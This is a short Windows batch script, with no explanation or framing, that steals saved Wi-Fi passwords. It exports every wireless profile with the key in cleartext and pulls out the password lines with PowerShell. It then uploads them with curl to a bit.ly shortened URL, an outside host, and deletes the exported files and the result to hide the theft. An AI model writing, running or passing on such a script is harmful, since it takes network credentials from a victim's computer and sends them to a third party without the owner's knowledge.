@echo off
cd %temp%
netsh wlan export profile key=clear
powershell Select-String -Path Wi-Fi* -Pattern 'keyMaterial' > WiFiResult
curl -T WiFiResult -L https://bit.ly/3DHmzBN
del Wi-Fi* /s /f /q
del WiFiResult /s /f /q
